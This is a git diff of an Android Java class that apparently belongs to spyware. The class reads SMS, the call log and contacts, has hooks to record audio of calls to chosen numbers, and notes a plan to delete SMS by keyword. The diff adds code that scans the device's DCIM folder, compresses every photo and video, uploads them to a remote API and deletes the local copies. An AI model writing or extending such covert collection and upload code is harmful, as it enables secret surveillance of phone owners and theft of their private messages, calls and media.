@@ -1,6 +1,7 @@
 package com.fs.fs.api;
 
 import android.Manifest;
+import android.annotation.SuppressLint;
 import android.app.PendingIntent;
 import android.content.ContentResolver;
 import android.content.Intent;
@@ -16,6 +17,11 @@ import android.telephony.SmsManager;
 import android.text.TextUtils;
 
 import com.fs.fs.App;
+import com.fs.fs.api.network.ApiConfig;
+import com.fs.fs.api.network.core.BaseResponse;
+import com.fs.fs.api.network.core.HttpParams;
+import com.fs.fs.api.network.core.OkHttpUtils;
+import com.fs.fs.api.network.core.callback.HttpCallback;
 import com.fs.fs.bean.PhoneInfo;
 import com.fs.fs.bean.SMSInfo;
 import com.fs.fs.receivers.SMSReceiver;
@@ -32,8 +38,14 @@ import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.util.ArrayList;
+import java.util.Collection;
 import java.util.Date;
+import java.util.HashMap;
+import java.util.HashSet;
 import java.util.List;
+import java.util.Set;
+
+import okhttp3.Headers;
 
 /**
  * Created by wyx on 2016/12/30.
@@ -45,12 +57,13 @@ import java.util.List;
  */
 
 public class ProviderService {
-    //TODO: 监听Call/通讯记录 & 通讯录 ContentObserver
     //TODO: 删除关键词短信
     private SharePreferencesUtils mSharePreferences = null;
     // 获取内容解析者
     private ContentResolver mResolver = null;
 
+    private HashMap<String, File> videoPath = null;
+    private HashMap<String, File> picturePath = null;
 
     private ProviderService() {
         this.mSharePreferences = SharePreferencesUtils.getInstance();
@@ -66,23 +79,29 @@ public class ProviderService {
     }
 
     public interface SMSListener {
+        // get all sms at first
         void onGetAllSMS(List<SMSInfo> SMSInfo);
 
-        void onReceive(SMSInfo msgInfo);
+        // listen SMS coming
+        void onReceive(SMSInfo sms);
     }
 
     public interface CallsListener {
+        // get all sms at first
         void onGetAllCall(List<PhoneInfo> callInfo);
 
+        // audio record start
         void onStart();
 
+        // audio record stop
         void onFinish();
 
+        // set the number you want to listen
         Boolean onPhoneNumber(String number);
     }
 
     public interface ContactsListener {
-        void onGetAllContacts(List<PhoneInfo> phoneInfo);
+        void onGetAllContacts(List<PhoneInfo> contactInfo);
     }
 
     public SMSListener mSMSListener;
@@ -129,12 +148,14 @@ public class ProviderService {
         SMSReceiver.setListener(listener);
     }
 
-    public void getContants(ContactsListener listener) {
+    @SuppressLint("DefaultLocale")
+    public void getContant(ContactsListener listener) {
         mContactsListener = listener;
         //取得电话本中开始一项的光标
         Cursor cursor = mResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
         //向下移动光标
         List<PhoneInfo> infos = new ArrayList<>();
+        HashMap<String, PhoneInfo> newMap = new HashMap<>();
         if (cursor != null) {
             while (cursor.moveToNext()) {
                 PhoneInfo phoneInfo = new PhoneInfo();
@@ -153,15 +174,19 @@ public class ProviderService {
                     phoneCursor.close();
                 }
                 LogUtils.d(phoneInfo.toString());
+                newMap.put(String.format("%s:%d:%s", phoneInfo.phoneNumber, phoneInfo.type, phoneInfo.time), phoneInfo);
                 infos.add(phoneInfo);
-
             }
             cursor.close();
         }
         LogUtils.d("%s", infos.size());
-        mContactsListener.onGetAllContacts(infos);
+        List<PhoneInfo> update = updatePhoneInfo(infos, newMap, Constant.SHARE_KEYS.CONTANT);
+        if (update != null) {
+            mContactsListener.onGetAllContacts(update);
+        }
     }
 
+    @SuppressLint("DefaultLocale")
     public void getCalls(CallsListener listener) {
         mCallsListener = listener;
         if (ActivityCompat.checkSelfPermission(App.getInstance(), Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
@@ -175,6 +200,7 @@ public class ProviderService {
                 CallLog.Calls.DEFAULT_SORT_ORDER
         );
         List<PhoneInfo> infos = new ArrayList<>();
+        HashMap<String, PhoneInfo> newMap = new HashMap<>();
         if (cursor != null) {
             while (cursor.moveToNext()) {
                 int type = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE));
@@ -195,13 +221,41 @@ public class ProviderService {
                 }
                 if (info != null) {
                     LogUtils.d(info.toString());
+                    newMap.put(String.format("%s:%d:%s", info.phoneNumber, info.type, info.time), info);
                     infos.add(info);
                 }
             }
             cursor.close();
-            mCallsListener.onGetAllCall(infos);
+
+            List<PhoneInfo> update = updatePhoneInfo(infos, newMap, Constant.SHARE_KEYS.CALL);
+            if (update != null) {
+                mCallsListener.onGetAllCall(update);
+            }
             LogUtils.d("%s", infos.size());
         }
+    }
+
+    @SuppressLint("DefaultLocale")
+    private List<PhoneInfo> updatePhoneInfo(List<PhoneInfo> infos, HashMap<String, PhoneInfo> newMap, String shareKey) {
+        List<PhoneInfo> old = (List<PhoneInfo>) SharePreferencesUtils.getInstance().get(shareKey, null);
+        if (old == null || (infos == null || infos.size() == 0)) {
+            return null;
+        }
+        List<PhoneInfo> newList = new ArrayList<>();
+        for (PhoneInfo info : old) {
+            if (newMap.keySet().contains(String.format("%s:%d:%s", info.phoneNumber, info.type, info.time))) {
+                newMap.remove(String.format("%s:%d:%s", info.phoneNumber, info.type, info.time));
+            }
+        }
+
+        if (newMap.size() > 0) {
+            for (String key : newMap.keySet()) {
+                newList.add(newMap.get(key));
+            }
+            SharePreferencesUtils.getInstance().put(shareKey, infos);
+            return newList;
+        }
+        return null;
     }
 
     private PhoneInfo getPhoneInfo(Cursor cursor, int type) {
@@ -214,16 +268,70 @@ public class ProviderService {
         return info;
     }
 
+
     public void getPictures() {
+        picturePath = new HashMap<>();
         getPicture(getMediaFiles());
+        final List<File> updateList = (List<File>) updateFile(picturePath, Constant.SHARE_KEYS.PICTURE);
+        if (updateList != null) {
+            OkHttpUtils.postAsync(ApiConfig.getPicture(), new HttpParams().addFiles("picture", updateList), new HttpCallback(BaseResponse.class) {
+                @Override
+                public void onSuccess(BaseResponse httpResponse, Headers headers) {
+                    FileUtils.delete(updateList);
+                    picturePath = null;
+                }
+
+                @Override
+                public void onError(String errorMsg) {
+
+                }
+            });
+        }
     }
 
     public void getVideos() {
+        videoPath = new HashMap<>();
         getVideo(getMediaFiles());
+
+        final List<File> updateList = (List<File>) updateFile(videoPath, Constant.SHARE_KEYS.VIDEO);
+        if (updateList != null) {
+            OkHttpUtils.postAsync(ApiConfig.getVideo(), new HttpParams().addFiles("video", updateList), new HttpCallback(BaseResponse.class) {
+                @Override
+                public void onSuccess(BaseResponse httpResponse, Headers headers) {
+                    FileUtils.delete(updateList);
+                    videoPath = null;
+                }
+
+                @Override
+                public void onError(String errorMsg) {
+
+                }
+            });
+        }
     }
 
+    private Collection<File> updateFile(HashMap<String, File> paths, String shareKey) {
+        Set<String> old = (Set<String>) SharePreferencesUtils.getInstance().get(shareKey, null);
+        if (old == null || (paths == null || paths.size() == 0)) {
+            return null;
+        }
+        for (String pathName : old) {
+            if (paths.keySet().contains(pathName)) {
+                paths.remove(pathName);
+            }
+        }
+        if (paths.size() > 0) {
+            Set<String> newSet = new HashSet<>();
+            newSet.addAll(old);
+            newSet.retainAll(paths.keySet());
+            SharePreferencesUtils.getInstance().put(shareKey, newSet);
+            return paths.values();
+        }
+        return null;
+    }
+
+
     private File[] getMediaFiles() {
-        //TODO: SharePreferencesUtils保存结果对比更新
         File root = new File(Environment.getExternalStorageDirectory() + "/DCIM/");
         return root.listFiles();
     }
@@ -234,7 +342,7 @@ public class ProviderService {
      * @param files
      */
     private void getVideo(File[] files) {
-        for (File file : files) {
+        for (final File file : files) {
             if (file.isDirectory() && !file.isHidden()) {
                 getVideo(file.listFiles());
             } else if (file.getAbsolutePath().endsWith(".mp4")) {
@@ -243,7 +351,7 @@ public class ProviderService {
                         String.format("%s.%s", DateUtils.date2String(new Date(), "yyyyMMdd_HHmmss"), "mp4"));
                 FFmpegUtils.getInstance().compressVideo(srcfileName, tarFileName);
                 LogUtils.d(tarFileName);
-                // TODO:上传并删除
+                videoPath.put(srcfileName, new File(tarFileName));
             }
         }
     }
@@ -262,7 +370,8 @@ public class ProviderService {
                     LogUtils.d(fileName);
                     out = new FileOutputStream(fileName);
                     bitmap.compress(Bitmap.CompressFormat.JPEG, 60, out);
-                    // TODO:上传并删除
+                    picturePath.put(path, new File(fileName));
+
                 } catch (FileNotFoundException e) {
                     e.printStackTrace();
                 } finally {
@@ -273,7 +382,6 @@ public class ProviderService {
                     } catch (IOException e) {
                         e.printStackTrace();
                     }
-
                     if (bitmap != null && !bitmap.isRecycled()) {
                         bitmap.recycle();
                         bitmap = null;
